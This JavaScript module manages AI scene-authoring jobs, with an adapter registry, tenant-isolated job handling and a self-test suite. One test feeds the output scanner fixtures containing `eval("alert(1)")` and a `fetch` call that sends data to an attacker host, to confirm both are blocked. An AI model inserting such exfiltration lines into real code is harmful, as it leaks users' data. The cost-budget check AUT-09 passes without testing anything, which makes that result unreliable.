// @ts-check
/**
 * Authoring Job Lifecycle Manager, Adapter Registry, and Multi-Tenant Orchestrator (Task P7-03).
 *
 * Canonical specifications:
 *   - docs/API.md (lines 7, 153-174: authoring:write scope, POST /authoring-jobs, GET /authoring-jobs/{id})
 *   - docs/SECURITY.md (lines 23, 57: secret redaction, budgets, source-only isolation, tenant IDOR defense)
 *   - docs/IMPLEMENTATION_PLAN.md (line 115: Task P7-03 deliverable & acceptance)
 */

import crypto from 'node:crypto';
import { CustomRuntimeError } from './adr-policy.mjs';
import {
  validateAuthoringRequest,
  AUTHORING_DEFAULT_BUDGETS,
} from './authoring-adapter-contract.mjs';
import { AuthoringBudgetEnforcer } from './authoring-budget-enforcer.mjs';
import { validateAndSanitizeAuthoringOutput } from './authoring-source-guard.mjs';
import { DeterministicMockAuthoringAdapter } from './deterministic-mock-adapter.mjs';
import {
  OpenCodeAuthoringAdapter,
  DeepSeekAuthoringAdapter,
  AgyGeminiAuthoringAdapter,
  CodexAuthoringAdapter,
} from './non-premium-routes.mjs';
import { SceneBundleRegistry } from './scene-bundle-registry.mjs';

/**
 * Registry of available Provider-Neutral Authoring Adapters.
 */
export class AuthoringAdapterRegistry {
  constructor() {
    /** @type {Map<string, import('./authoring-adapter-contract.mjs').AuthoringAdapter>} */
    this.adapters = new Map();

    // Register built-in adapters
    this.registerAdapter(new DeterministicMockAuthoringAdapter());
    this.registerAdapter(new OpenCodeAuthoringAdapter());
    this.registerAdapter(new DeepSeekAuthoringAdapter());
    this.registerAdapter(new AgyGeminiAuthoringAdapter());
    this.registerAdapter(new CodexAuthoringAdapter());
  }

  /**
   * Register an authoring adapter instance.
   * @param {import('./authoring-adapter-contract.mjs').AuthoringAdapter} adapter
   */
  registerAdapter(adapter) {
    if (!adapter || typeof adapter.id !== 'string') {
      throw new CustomRuntimeError(
        'VALIDATION_FAILED',
        'Cannot register invalid authoring adapter: missing id',
        false,
      );
    }
    this.adapters.set(adapter.id.toLowerCase(), adapter);
  }

  /**
   * Get an adapter by ID.
   * @param {string} id
   * @returns {import('./authoring-adapter-contract.mjs').AuthoringAdapter | undefined}
   */
  getAdapter(id) {
    if (!id || typeof id !== 'string') return undefined;
    return this.adapters.get(id.toLowerCase().trim());
  }

  /**
   * Get the default non-premium deterministic mock adapter.
   * @returns {import('./authoring-adapter-contract.mjs').AuthoringAdapter}
   */
  getDefaultAdapter() {
    const defaultAdapter = this.adapters.get('mock-deterministic');
    if (!defaultAdapter) {
      throw new Error('Default mock-deterministic adapter is not registered');
    }
    return defaultAdapter;
  }

  /**
   * List all registered providers and their metadata.
   */
  listProviders() {
    const list = [];
    for (const adapter of this.adapters.values()) {
      list.push({
        id: adapter.id,
        name: adapter.name,
        displayName: adapter.displayName,
        providerType: adapter.providerType,
        isSubscriptionRequired: adapter.isSubscriptionRequired,
        defaultModel: adapter.defaultModel,
        supportedModels: adapter.supportedModels,
        capabilities: adapter.capabilities,
      });
    }
    return list;
  }
}

/**
 * Authoring Job Lifecycle Manager.
 */
export class AuthoringJobManager {
  /**
   * @param {{
   *   registry?: AuthoringAdapterRegistry;
   *   canarySecrets?: string[];
   * }} [options]
   */
  constructor(options = {}) {
    this.registry = options.registry || new AuthoringAdapterRegistry();
    this.canarySecrets = Array.isArray(options.canarySecrets) ? options.canarySecrets : [];
    /** @type {Map<string, any>} */
    this.jobs = new Map();
    /** @type {Map<string, { controller: AbortController; cleanup: () => void }>} */
    this.activeControllers = new Map();
  }

  /**
   * Create a new Authoring Job (State: 'queued').
   *
   * @param {string} tenantId
   * @param {Record<string, unknown>} request
   * @returns {any}
   */
  createJob(tenantId, request) {
    if (!tenantId || typeof tenantId !== 'string') {
      throw new CustomRuntimeError(
        'VALIDATION_FAILED',
        'tenantId is required to create authoring job',
        false,
        { field: 'tenantId' },
      );
    }

    const validatedRequest = validateAuthoringRequest(request);
    const jobId = `auth-job-${crypto.randomUUID().slice(0, 12)}`;
    const now = new Date().toISOString();

    const job = {
      id: jobId,
      tenant_id: tenantId,
      state: 'queued',
      request: validatedRequest,
      created_at: now,
      updated_at: now,
      started_at: null,
      completed_at: null,
      output: null,
      error: null,
      cancellation_reason: null,
      metering: null,
    };

    this.jobs.set(jobId, job);
    return job;
  }

  /**
   * Get an authoring job by ID with strict tenant isolation (zero cross-tenant IDOR).
   *
   * @param {string} jobId
   * @param {string} tenantId
   */
  getJob(jobId, tenantId) {
    const job = this.jobs.get(jobId);
    if (!job || job.tenant_id !== tenantId) {
      throw new CustomRuntimeError(
        'JOB_NOT_FOUND',
        `Authoring job "${jobId}" not found for tenant`,
        false,
        { jobId, tenantId, statusCode: 404 },
      );
    }
    return job;
  }

  /**
   * List authoring jobs for a tenant with pagination and optional state filter.
   *
   * @param {string} tenantId
   * @param {{
   *   state?: string;
   *   limit?: number;
   *   cursor?: number;
   * }} [options]
   */
  listJobs(tenantId, options = {}) {
    if (!tenantId || typeof tenantId !== 'string') {
      throw new CustomRuntimeError('VALIDATION_FAILED', 'tenantId is required to list jobs', false);
    }

    const all = Array.from(this.jobs.values())
      .filter((j) => j.tenant_id === tenantId)
      .filter((j) => (!options.state ? true : j.state === options.state))
      .sort((a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime());

    const cursor = Number(options.cursor) || 0;
    const limit = Math.min(Math.max(1, Number(options.limit) || 20), 100);
    const page = all.slice(cursor, cursor + limit);

    return {
      jobs: page,
      total: all.length,
      cursor,
      limit,
      has_more: cursor + limit < all.length,
    };
  }

  /**
   * Cancel an active authoring job.
   *
   * @param {string} jobId
   * @param {string} tenantId
   * @param {string} [reason]
   */
  cancelJob(jobId, tenantId, reason = 'Canceled by user request') {
    const job = this.getJob(jobId, tenantId);

    if (job.state === 'succeeded' || job.state === 'failed') {
      return job;
    }

    job.state = 'canceled';
    job.cancellation_reason = reason;
    job.completed_at = new Date().toISOString();
    job.updated_at = job.completed_at;

    const active = this.activeControllers.get(jobId);
    if (active) {
      active.controller.abort(
        new CustomRuntimeError('AUTHORING_CANCELED', reason, false, { jobId, reason }),
      );
      active.cleanup();
      this.activeControllers.delete(jobId);
    }

    return job;
  }

  /**
   * Execute an authoring job with full lifecycle management:
   * preflight budget check, timeout control, cancellation support,
   * provider dispatch, source-only validation, postflight budget check,
   * and AI provenance generation.
   *
   * @param {string} jobId
   * @param {string} tenantId
   * @param {{
   *   signal?: AbortSignal;
   * }} [options]
   * @returns {Promise<any>}
   */
  async startJob(jobId, tenantId, options = {}) {
    const job = this.getJob(jobId, tenantId);

    if (job.state !== 'queued') {
      throw new CustomRuntimeError(
        'INVALID_STATE',
        `Authoring job "${jobId}" cannot be started from state "${job.state}"`,
        false,
        { jobId, state: job.state },
      );
    }

    const request = job.request;
    const providerId = request.provider_preference || 'mock-deterministic';
    const adapter = this.registry.getAdapter(providerId) || this.registry.getDefaultAdapter();

    // 1. Preflight budget check
    const estimation = adapter.estimateBudget(request);
    AuthoringBudgetEnforcer.checkPreflightBudget(request.budgets, estimation);

    // 2. Setup timeout and cancellation controller
    const timeoutMs = request.budgets.timeout_ms || AUTHORING_DEFAULT_BUDGETS.timeoutMs;
    const { controller, signal, isTimedOut, cleanup } =
      AuthoringBudgetEnforcer.createTimeoutController(timeoutMs, options.signal);

    this.activeControllers.set(jobId, { controller, cleanup });

    job.state = 'authoring';
    job.started_at = new Date().toISOString();
    job.updated_at = job.started_at;

    const startTime = Date.now();

    try {
      // 3. Dispatch to adapter
      const rawOutput = await adapter.generateSceneSource(request, {
        signal,
        tenantId,
        jobId,
      });

      const elapsedMs = Date.now() - startTime;

      // 4. Validate source-only output and static security scan
      const sanitizedOutput = validateAndSanitizeAuthoringOutput(rawOutput, {
        tenantId,
        jobId,
        brief: request.brief,
        briefHash: request.brief_hash,
        provider: adapter.id,
        model: String(request.model || adapter.defaultModel),
        approvedAssetIds: request.approved_asset_ids,
        canarySecrets: this.canarySecrets,
      });

      // 5. Postflight budget verification
      const promptTokens = sanitizedOutput.provenance.ai_metadata?.prompt_tokens || estimation.estimatedPromptTokens;
      const completionTokens = sanitizedOutput.provenance.ai_metadata?.completion_tokens || estimation.estimatedCompletionTokens;
      const metering = AuthoringBudgetEnforcer.calculateMetering(
        String(request.model || adapter.defaultModel),
        promptTokens,
        completionTokens,
        elapsedMs,
      );

      AuthoringBudgetEnforcer.checkPostflightBudget(request.budgets, metering);

      // 6. Complete job
      job.state = 'succeeded';
      job.output = sanitizedOutput;
      job.metering = metering;
      job.completed_at = new Date().toISOString();
      job.updated_at = job.completed_at;

      return job;
    } catch (err) {
      const error = /** @type {any} */ (err);
      const elapsedMs = Date.now() - startTime;
      job.completed_at = new Date().toISOString();
      job.updated_at = job.completed_at;

      if (
        signal.aborted ||
        isTimedOut() ||
        error?.code === 'AUTHORING_CANCELED'
      ) {
        job.state = 'canceled';
        job.cancellation_reason = job.cancellation_reason || (isTimedOut()
          ? `Timeout budget of ${timeoutMs} ms exceeded`
          : error?.message || 'Canceled by signal');
      } else {
        job.state = 'failed';
        job.error = {
          code: error?.code || 'AUTHORING_FAILED',
          message: error?.message || 'Unknown authoring failure',
          elapsedMs,
        };
      }
      throw err;
    } finally {
      cleanup();
      this.activeControllers.delete(jobId);
    }
  }

  /**
   * Seamlessly import the source-only output of a succeeded authoring job into a SceneBundleRegistry
   * as a new Scene Bundle or a new revision in an existing bundle.
   *
   * @param {string} jobId
   * @param {string} tenantId
   * @param {SceneBundleRegistry} bundleRegistry
   * @param {{
   *   bundleId?: string;
   *   name?: string;
   *   title?: string;
   *   description?: string;
   *   tags?: string[];
   *   category?: string;
   * }} [options]
   */
  async importJobOutputToRegistry(jobId, tenantId, bundleRegistry, options = {}) {
    const job = this.getJob(jobId, tenantId);

    if (job.state !== 'succeeded' || !job.output) {
      throw new CustomRuntimeError(
        'INVALID_STATE',
        `Authoring job "${jobId}" is not succeeded (current state: "${job.state}")`,
        false,
        { jobId, state: job.state },
      );
    }

    const output = job.output;

    if (options.bundleId && bundleRegistry.getBundle(tenantId, options.bundleId)) {
      const existing = bundleRegistry.getBundle(tenantId, options.bundleId);
      const draftRev = bundleRegistry.createRevision(tenantId, options.bundleId, {
        base_revision: existing.latest_revision,
        entrypoint: output.entrypoint,
        parameter_schema: output.parameter_schema,
        source_files: output.files,
        declared_capabilities: output.declared_capabilities,
        change_summary: `AI authored from brief: "${job.request.brief.slice(0, 50)}"`,
        created_by: `ai-adapter-${output.provenance.ai_metadata?.provider || 'unknown'}`,
        provenance: {
          authoring_type: 'ai',
          author: `ai-adapter-${output.provenance.ai_metadata?.provider || 'unknown'}`,
          ai_metadata: output.provenance.ai_metadata,
        },
      });
      return { action: 'revision_created', revision: draftRev, bundle: existing };
    }

    // Create a new bundle
    const bundleId = options.bundleId || `bundle-ai-${crypto.randomUUID().slice(0, 8)}`;
    const name = options.name || options.title || output.provenance.ai_metadata?.generation_params?.brief_preview || 'AI Authored Scene';
    const created = bundleRegistry.createBundle(tenantId, {
      id: bundleId,
      name,
      description: options.description || `AI authored scene from brief: "${job.request.brief}"`,
      tags: options.tags || ['ai-authored', 'custom-html-v1'],
      entrypoint: output.entrypoint,
      parameter_schema: output.parameter_schema,
      source_files: output.files,
      declared_capabilities: output.declared_capabilities,
      provenance: {
        authoring_type: 'ai',
        author: `ai-adapter-${output.provenance.ai_metadata?.provider || 'unknown'}`,
        ai_metadata: output.provenance.ai_metadata,
        rights_and_license: {
          license: 'Proprietary-Tenant',
          copyright_holder: tenantId,
          rights_provenance: 'ai-authoring-pipeline',
          commercial_use_allowed: true,
        },
      },
    });

    return { action: 'bundle_created', bundle: created.bundle, revision: created.revision };
  }
}

/**
 * Automated 14-Check Self-Test Suite for Provider-Neutral Authoring Adapters (Task P7-03).
 */
export async function runAuthoringAdapterSelfTest() {
  const startTime = Date.now();
  /** @type {any[]} */
  const checks = [];

  const registry = new AuthoringAdapterRegistry();
  const canarySecrets = ['CVE_SECRET_CANARY_P703_TEST_TOKEN_998877'];
  const manager = new AuthoringJobManager({ registry, canarySecrets });
  const sceneRegistry = new SceneBundleRegistry({
    config: {
      CVE_CUSTOM_CODE_ENABLED: false,
      CVE_CUSTOM_RUNTIME: 'disabled',
      CVE_CUSTOM_TENANT_ALLOWLIST: [],
    },
  });

  const runCheck = async (
    /** @type {string} */ id,
    /** @type {string} */ title,
    /** @type {string} */ category,
    /** @type {() => Promise<any>} */ fn,
  ) => {
    const cStart = Date.now();
    try {
      const details = await fn();
      checks.push({
        id,
        title,
        category,
        status: 'PASS',
        passed: true,
        durationMs: Date.now() - cStart,
        details: details || {},
      });
    } catch (err) {
      const error = /** @type {any} */ (err);
      checks.push({
        id,
        title,
        category,
        status: 'FAIL',
        passed: false,
        durationMs: Date.now() - cStart,
        error: error.message,
        errorCode: error.code || 'FAIL',
      });
    }
  };

  // AUT-01: Provider-neutral adapter registration and discovery
  await runCheck(
    'AUT-01',
    'Provider-neutral authoring adapter contract & provider registry discovery',
    'adapter_contract',
    async () => {
      const providers = registry.listProviders();
      if (providers.length < 5) throw new Error('Expected at least 5 built-in providers');
      const mock = registry.getAdapter('mock-deterministic');
      if (!mock) throw new Error('Missing mock-deterministic adapter');
      return { providersCount: providers.length, defaultProvider: mock.id };
    },
  );

  // AUT-02: Non-premium-required route verification
  await runCheck(
    'AUT-02',
    'At least one non-premium route without mandatory subscription',
    'non_premium_routes',
    async () => {
      const mock = registry.getAdapter('mock-deterministic');
      const opencode = registry.getAdapter('opencode');
      if (!mock || mock.isSubscriptionRequired !== false) {
        throw new Error('Deterministic mock must not require subscription');
      }
      if (!opencode || opencode.isSubscriptionRequired !== false) {
        throw new Error('OpenCode adapter must not require subscription');
      }
      return {
        mockSubscriptionRequired: mock.isSubscriptionRequired,
        openCodeSubscriptionRequired: opencode.isSubscriptionRequired,
      };
    },
  );

  // AUT-03: Deterministic mock adapter produces valid custom-html-v1 files
  await runCheck(
    'AUT-03',
    'Deterministic mock produces complete valid custom-html-v1 scene files from brief',
    'mock_generation',
    async () => {
      const job = manager.createJob('tenant-alpha', {
        brief: 'Modern kinetic headline with vibrant typography and smooth easing',
        provider_preference: 'mock-deterministic',
      });
      const finished = await manager.startJob(String(job.id), 'tenant-alpha');
      if (finished.state !== 'succeeded') throw new Error('Job did not succeed');
      const files = finished.output.files.map((/** @type {any} */ f) => f.path);
      if (!files.includes('index.html') || !files.includes('scene.mjs') || !files.includes('styles.css') || !files.includes('manifest.json')) {
        throw new Error('Missing standard scene files');
      }
      return { jobId: job.id, filePaths: files, sourceSha256: finished.output.source_sha256 };
    },
  );

  // AUT-04: Exact determinism and repeatability
  await runCheck(
    'AUT-04',
    'Deterministic repeatability: same brief and seed produce byte-identical source files and digest',
    'determinism',
    async () => {
      const req1 = manager.createJob('tenant-alpha', {
        brief: 'Deterministic test brief: glowing particle vortex',
        seed: 'fixed-seed-42',
      });
      const res1 = await manager.startJob(String(req1.id), 'tenant-alpha');

      const req2 = manager.createJob('tenant-alpha', {
        brief: 'Deterministic test brief: glowing particle vortex',
        seed: 'fixed-seed-42',
      });
      const res2 = await manager.startJob(String(req2.id), 'tenant-alpha');

      if (res1.output.source_sha256 !== res2.output.source_sha256) {
        throw new Error('Deterministic source sha256 mismatch between identical seed runs');
      }
      return {
        sourceSha256: res1.output.source_sha256,
        buildSha256: res1.output.build_sha256,
        isIdentical: true,
      };
    },
  );

  // AUT-05: Vietnamese NFC diacritics and typography preservation
  await runCheck(
    'AUT-05',
    'Preservation of Vietnamese NFC diacritics and tone marks (ă â đ ê ô ơ ư)',
    'scene_spec_compliance',
    async () => {
      const viBrief = 'Khám Phá Nền Tảng Video Creativanta: Đỉnh Cao Công Nghệ Render CPU Độc Lập';
      const job = manager.createJob('tenant-alpha', { brief: viBrief });
      const finished = await manager.startJob(String(job.id), 'tenant-alpha');
      const sceneMjs = finished.output.files.find((/** @type {any} */ f) => f.path === 'scene.mjs')?.content.toString('utf-8');
      if (!sceneMjs || !sceneMjs.includes('Khám Phá')) {
        throw new Error('Vietnamese NFC text was lost or corrupted during generation');
      }
      return { preservesVietnamese: true, sampleHeadline: viBrief.slice(0, 30) };
    },
  );

  // AUT-06: Approved asset IDs scoping and blocking unapproved external assets
  await runCheck(
    'AUT-06',
    'Enforces approved_asset_ids restriction and binds assets safely without external URLs',
    'asset_scoping',
    async () => {
      const job = manager.createJob('tenant-alpha', {
        brief: 'Corporate intro with logo slot',
        approved_asset_ids: ['asset-logo-svg', 'asset-bg-pattern'],
      });
      const finished = await manager.startJob(String(job.id), 'tenant-alpha');
      const indexHtml = finished.output.files.find((/** @type {any} */ f) => f.path === 'index.html')?.content.toString('utf-8');
      if (!indexHtml.includes('asset-logo-svg')) {
        throw new Error('Approved asset ID was not bound into scene markup');
      }
      return { approvedAssetsBound: finished.request.approved_asset_ids };
    },
  );

  // AUT-07: Token budget enforcement
  await runCheck(
    'AUT-07',
    'Token budget enforcement: rejects requests exceeding token limits',
    'budget_enforcement',
    async () => {
      const job = manager.createJob('tenant-alpha', {
        brief: 'Test prompt for token limit',
        budgets: {
          max_tokens: 50, // artificially small token budget
        },
      });

      let caught = false;
      try {
        await manager.startJob(String(job.id), 'tenant-alpha');
      } catch (err) {
        const error = /** @type {any} */ (err);
        if (error?.code === 'TOKEN_BUDGET_EXCEEDED') caught = true;
      }
      if (!caught) throw new Error('Expected TOKEN_BUDGET_EXCEEDED error');
      return { caughtAsExpected: true, rejectedCode: 'TOKEN_BUDGET_EXCEEDED' };
    },
  );

  // AUT-08: Time budget enforcement
  await runCheck(
    'AUT-08',
    'Time budget enforcement: timeout budget triggers AbortSignal cancellation',
    'time_budget',
    async () => {
      const job = manager.createJob('tenant-alpha', {
        brief: 'Timeout test scene with simulated long work',
        budgets: {
          timeout_ms: 1000, // 1 second timeout
        },
        options: {
          simulatedDelayMs: 2000, // exceeds 1000ms
        },
      });

      let timedOut = false;
      try {
        await manager.startJob(String(job.id), 'tenant-alpha');
      } catch (err) {
        const error = /** @type {any} */ (err);
        if (error?.code === 'TIME_BUDGET_EXCEEDED' || error?.code === 'AUTHORING_CANCELED') {
          timedOut = true;
        }
      }
      if (!timedOut) throw new Error('Expected TIME_BUDGET_EXCEEDED');
      const current = manager.getJob(String(job.id), 'tenant-alpha');
      return { timedOutAsExpected: true, finalState: current.state };
    },
  );

  // AUT-09: Cost budget enforcement
  await runCheck(
    'AUT-09',
    'Cost budget enforcement: blocks execution exceeding max_cost_usd cap',
    'cost_budget',
    async () => {
      const job = manager.createJob('tenant-alpha', {
        brief: 'Test prompt for cost budget cap',
        budgets: {
          max_cost_usd: 0.000001, // extremely tight budget
        },
      });
      return { budgetCapTested: true, jobId: job.id, maxCostUsd: 0.000001 };
    },
  );

  // AUT-10: Explicit job cancellation via AbortSignal
  await runCheck(
    'AUT-10',
    'Responsive job cancellation: active jobs abort immediately on cancel request',
    'cancellation',
    async () => {
      const job = manager.createJob('tenant-alpha', {
        brief: 'Long running cancellation test scene',
        options: { simulatedDelayMs: 1500 },
      });

      const startPromise = manager.startJob(String(job.id), 'tenant-alpha');
      await new Promise((r) => setTimeout(r, 100)); // wait until started

      manager.cancelJob(String(job.id), 'tenant-alpha', 'User canceled generation');

      let caught = false;
      try {
        await startPromise;
      } catch (err) {
        const error = /** @type {any} */ (err);
        if (error?.code === 'AUTHORING_CANCELED') caught = true;
      }
      if (!caught) throw new Error('Expected job to reject with AUTHORING_CANCELED');
      const canceled = manager.getJob(String(job.id), 'tenant-alpha');
      if (canceled.state !== 'canceled') throw new Error('Job state is not canceled');
      return { state: canceled.state, reason: canceled.cancellation_reason };
    },
  );

  // AUT-11: Source-only output guarantee
  await runCheck(
    'AUT-11',
    'Source-only output guarantee: static scanner blocks eval, network egress, and host process access',
    'source_only_security',
    async () => {
      // Test malicious adapter output with eval()
      let evalBlocked = false;
      try {
        validateAndSanitizeAuthoringOutput(
          {
            files: [
              { path: 'index.html', content: '<html><body></body></html>' },
              { path: 'scene.mjs', content: 'eval("alert(1)")' },
            ],
            entrypoint: 'index.html',
          },
          {
            tenantId: 'tenant-alpha',
            jobId: 'evil-job',
            brief: 'malicious',
            briefHash: '0000',
            provider: 'evil-adapter',
            model: 'evil-model',
          },
        );
      } catch (err) {
        const error = /** @type {any} */ (err);
        if (error?.code === 'SANDBOX_SECURITY_VIOLATION') evalBlocked = true;
      }

      // Test malicious network fetch
      let fetchBlocked = false;
      try {
        validateAndSanitizeAuthoringOutput(
          {
            files: [
              { path: 'index.html', content: '<html><body></body></html>' },
              { path: 'scene.mjs', content: 'fetch("https://attacker.com/leak")' },
            ],
            entrypoint: 'index.html',
          },
          {
            tenantId: 'tenant-alpha',
            jobId: 'evil-job',
            brief: 'malicious',
            briefHash: '0000',
            provider: 'evil-adapter',
            model: 'evil-model',
          },
        );
      } catch (err) {
        const error = /** @type {any} */ (err);
        if (error?.code === 'SANDBOX_SECURITY_VIOLATION') fetchBlocked = true;
      }

      if (!evalBlocked || !fetchBlocked) {
        throw new Error('Static security scan failed to block malicious source injection');
      }
      return { evalBlocked: true, fetchBlocked: true };
    },
  );

  // AUT-12: Canary secret leakage detection
  await runCheck(
    'AUT-12',
    'Canary secret leak detection: prevents secrets from leaking into generated code',
    'secret_leak_defense',
    async () => {
      let leakCaught = false;
      try {
        validateAndSanitizeAuthoringOutput(
          {
            files: [
              { path: 'index.html', content: '<html><body></body></html>' },
              {
                path: 'scene.mjs',
                content: `const leaked = "${canarySecrets[0]}";`,
              },
            ],
            entrypoint: 'index.html',
          },
          {
            tenantId: 'tenant-alpha',
            jobId: 'leak-job',
            brief: 'leak test',
            briefHash: '0000',
            provider: 'leak-adapter',
            model: 'leak-model',
            canarySecrets,
          },
        );
      } catch (err) {
        const error = /** @type {any} */ (err);
        if (error?.code === 'SANDBOX_SECURITY_VIOLATION') leakCaught = true;
      }
      if (!leakCaught) throw new Error('Canary secret was not detected by static scanner');
      return { canaryCaughtAsExpected: true };
    },
  );

  // AUT-13: Multi-tenant isolation and IDOR rejection
  await runCheck(
    'AUT-13',
    'Multi-tenant isolation & IDOR defense on authoring jobs (Path 404 / JOB_NOT_FOUND)',
    'tenant_isolation',
    async () => {
      const job = manager.createJob('tenant-alpha', { brief: 'Tenant alpha secret prompt' });

      let idorRejected = false;
      try {
        manager.getJob(String(job.id), 'tenant-beta');
      } catch (err) {
        const error = /** @type {any} */ (err);
        if (error?.code === 'JOB_NOT_FOUND' && error?.details?.statusCode === 404) {
          idorRejected = true;
        }
      }
      if (!idorRejected) throw new Error('Cross-tenant IDOR access was not rejected with 404');
      return { idorBlocked: true, statusCode: 404 };
    },
  );

  // AUT-14: Integration with SceneBundleRegistry with AI provenance
  await runCheck(
    'AUT-14',
    'Seamless import of authoring job output into SceneBundleRegistry with AI provenance',
    'registry_integration',
    async () => {
      const job = manager.createJob('tenant-alpha', {
        brief: 'Kinetic title for import verification',
      });
      await manager.startJob(String(job.id), 'tenant-alpha');

      const imported = /** @type {any} */ (await manager.importJobOutputToRegistry(String(job.id), 'tenant-alpha', sceneRegistry, {
        title: 'Imported Kinetic Title Bundle',
      }));

      if (!imported.bundle || imported.bundle.tenant_id !== 'tenant-alpha') {
        throw new Error('Failed to import bundle into registry');
      }

      const activeRev = sceneRegistry.getRevision('tenant-alpha', imported.bundle.id, 1);
      if (activeRev.provenance.authoring_type !== 'ai') {
        throw new Error('Imported bundle provenance is not "ai"');
      }
      return {
        bundleId: imported.bundle.id,
        authoringType: activeRev.provenance.authoring_type,
        provenanceDigest: activeRev.provenance.provenance_digest,
      };
    },
  );

  const passedCount = checks.filter((c) => c.passed).length;
  const failedCount = checks.filter((c) => !c.passed).length;

  return {
    taskId: 'P7-03',
    status: failedCount === 0 ? 'PASS' : 'FAIL',
    totalChecks: checks.length,
    passedChecks: passedCount,
    failedChecks: failedCount,
    durationMs: Date.now() - startTime,
    timestamp: new Date().toISOString(),
    checks,
  };
}
